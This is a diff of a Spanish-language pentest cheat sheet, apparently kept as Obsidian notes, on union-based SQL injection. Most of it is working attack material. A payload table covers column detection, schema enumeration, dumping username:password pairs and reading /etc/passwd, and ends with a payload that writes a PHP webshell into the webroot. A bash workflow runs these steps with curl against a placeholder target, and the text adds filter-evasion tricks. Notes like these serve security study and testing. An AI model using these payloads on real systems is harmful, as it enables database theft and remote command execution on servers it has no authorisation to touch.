@@ -1,44 +1,86 @@
 ---
 aliases:
-  - "Union-based SQLi"
+  - Union-based SQLi
 tags:
   - type/technique
   - vuln/sqli
   - technique/execution
   - asset/database
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[SQL Injection (SQLi)]]"
+  - '[[SQL Injection (SQLi)]]'
 ---
-# SQLi  - Union based
+# SQLi - Union based
 
 ***
 
 ## Cheatsheet
 
-|                     **Fase de Explotación**                      |                                                                                                                                                                                                                             **Payload Estructural**                                                                                                                                                                                                                             |                                                               **Notas de Ejecución**                                                                |
-| :--------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------: |
-|                  <br>**Detección de columnas**                   |                                                                                                                                                                                                                      <br>`ORDER BY 1--`<br>`ORDER BY 2--`                                                                                                                                                                                                                       |             <br>Incremento el índice posicional hasta generar un error. El último número válido es el total exacto de columnas.<br><br>             |
-|                   <br>**Alineación con Nulos**                   |                                                                                                                                                                                                                      <br>`UNION SELECT NULL, NULL, NULL--`                                                                                                                                                                                                                      | <br>Confirmo la cantidad de columnas. Uso `NULL` porque es compatible con la mayoría de los tipos de datos, evitando excepciones de casteo.<br><br> |
-|                 <br>**Identificación de Tipos**                  |                                                                                                                                                                                                                      <br>`UNION SELECT 'a', NULL, NULL--`                                                                                                                                                                                                                       |           <br>Reemplazo iterativamente los nulos por cadenas de texto para descubrir qué columna refleja strings en el frontend.<br><br>            |
-|                      <br>**Reconocimiento**                      |                                                                                                                                                                                                               <br>`UNION SELECT @@version, user(), database()--`                                                                                                                                                                                                                |                                    <br>Extracción inicial de metadatos del SGBD y contexto de ejecución.<br><br>                                    |
-|              <br><br><br>**Enumeración de Esquema**              |                                                    <br>**Listar bases de datos**<br>`UNION SELECT schema_name, NULL FROM information_schema.schemata--`<br>**Listar tablas**<br>`UNION SELECT table_name, NULL FROM information_schema.tables where table_schema = "db"--`<br>**Listar columnas**<br>`UNION SELECT column_name, NULL FROM information_schema.columnshere table_schema = "db" and table_name = "tabla"--`<br>                                                    |                           <br><br><br>Volcado de las estructuras internas para planificar extracciones dirigidas.<br><br>                           |
-|       <br><br><br><br><br>**Privilegios del Usuario**<br>        | <br>**Verificar si es Super Admin:**<br>`UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"--`<br>**Listar todos los privilegios:**<br>`UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"--`<br>**Verificar permisos File I/O:**<br>`UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"--`<br><br> |            <br><br><br><br><br>Verificación de los permisos del usuario que ejecuta la base de datos para evaluar vectores de escalada.             |
-| <br><br><br><br>**Escalada Crítica: SQLi to RCE (File I/O)**<br> |                  <br>**LFI (Lectura de archivos):**<br>`UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`<br>**File Write (Prueba simple):**<br>`UNION SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt'`<br>**RCE (Subida de Webshell PHP):**<br>`UNION SELECT "",'<?=$_GET[0]?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -`<br>**Ejecución vía navegador:**<br>`http://IP:PUERTO/shell.php?0=cat%20/etc/passwd`<br><br>                   |    <br><br><br><br>Uso de privilegios elevados y mala configuración de `secure_file_priv` para interactuar con el sistema operativo subyacente.     |
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `' ORDER BY 1-- -` (incrementar hasta error) | Cantidad exacta de columnas — último valor sin error | Primer paso obligatorio. |
+| `' UNION SELECT NULL,NULL,NULL-- -` | Confirma cantidad de columnas con NULLs (compatible con cualquier tipo) | Validación post-`ORDER BY`. |
+| `' UNION SELECT 'a',NULL,NULL-- -` (iterar columna) | Columna que refleja strings en frontend | Identificar dónde mostrar data. |
+| `' UNION SELECT @@version,user(),database()-- -` | Versión SGBD + user actual + DB activa | Recon inicial. |
+| `' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -` | Lista todas las bases de datos | Enum de DBs disponibles. |
+| `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='dev'-- -` | Tablas de la DB `dev` | Enum de tablas. |
+| `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -` | Columnas de tabla `users` | Enum de columnas. |
+| `' UNION SELECT group_concat(username,0x3a,password),NULL FROM users-- -` | Dump completo user:pass en una sola fila | Cuando frontend solo refleja 1 fila. |
+| `' UNION SELECT super_priv,NULL FROM mysql.user WHERE user='root'-- -` | Si root es Super Admin | Pre-RCE check. |
+| `' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Lista de privilegios root | Privilege enum. |
+| `' UNION SELECT variable_value,NULL FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -` | Path donde se permite read/write file | Pre-RCE — confirmar File I/O. |
+| `' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -` | Read arbitrario de archivos | `secure_file_priv=''` o path permitido + FILE privilege. |
+| `' UNION SELECT 'file written',NULL INTO OUTFILE '/var/www/html/proof.txt'-- -` | Write de archivo en filesystem | Mismo requisito. |
+| `' UNION SELECT '<?=`$_GET[0]`?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -` | Webshell PHP escrita al webroot → RCE | Filesystem writable + webroot accesible. |
 ^sqli-union
 
+### Workflow estándar
+
+```bash
+TARGET="https://target/items?id=1"
+
+# 1. Detectar nro columnas
+for i in 1 2 3 4 5 6 7 8 9 10; do
+  R=$(curl -s "$TARGET' ORDER BY $i-- -" -o /dev/null -w '%{http_code}')
+  echo "ORDER BY $i → HTTP $R"
+done
+# Cuando $R=500 (o cambia content), $i-1 es el total
+
+# 2. Validar UNION con NULLs (asumiendo 4 cols)
+curl -s "$TARGET' UNION SELECT NULL,NULL,NULL,NULL-- -"
+
+# 3. Identificar columnas reflejadas
+for col in 1 2 3 4; do
+  PAYLOAD="' UNION SELECT $([ $col -eq 1 ] && echo "'MARKER'" || echo NULL),$([ $col -eq 2 ] && echo "'MARKER'" || echo NULL),$([ $col -eq 3 ] && echo "'MARKER'" || echo NULL),$([ $col -eq 4 ] && echo "'MARKER'" || echo NULL)-- -"
+  curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"$PAYLOAD\"))")" | grep -c MARKER
+done
+
+# 4. Recon de SGBD
+curl -s "$TARGET' UNION SELECT NULL,@@version,NULL,NULL-- -"
+
+# 5. Dump combinado (cuando solo 1 fila se refleja)
+curl -s "$TARGET' UNION SELECT NULL,group_concat(username,0x3a,password),NULL,NULL FROM users-- -"
+
+# 6. Si privs File I/O OK → escalar a RCE
+curl -s "$TARGET' UNION SELECT NULL,'<?=\`\$_GET[0]\`?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -"
+curl "https://target/shell.php?0=id"
+```
 
 ___
 
 ## Overview
 
-El [[Union-based SQLi]] es un vector de ataque In-Band que aprovecha el operador `UNION` del lenguaje SQL para anexar un conjunto de resultados arbitrarios al conjunto de resultados de la consulta original elaborada por la aplicación. A diferencia del [[Error-based SQLi]] o las variantes inferenciales, esta técnica me permite recuperar grandes volúmenes de datos de forma directa y limpia dentro de la respuesta HTTP, convirtiéndola en el método de exfiltración más eficiente cuando el escenario lo permite.
+**Union-based SQLi** = aprovecho `UNION SELECT` para anexar resultados arbitrarios a la consulta original. Mejor método de exfiltración cuando aplica — directo, sin inferencias.
 
-Para que la inyección sea exitosa, la estructura de la consulta subyacente impone dos reglas matemáticas y lógicas que debo resolver antes de intentar cualquier exfiltración de datos.
+**Pre-requisitos:**
+1. Conocer cantidad exacta de columnas (`ORDER BY`).
+2. Conocer tipos compatibles (usar `NULL` evita issues).
+3. Saber cuál columna se refleja al frontend.
 
+Si la app filtra `UNION` → probar `/*!UNION*/`, `UNIunionON`, case mixing, encoding. Si frontend NO refleja ninguna columna → pivotar a [[SQLi - Error based]] o blind.
 
 ***
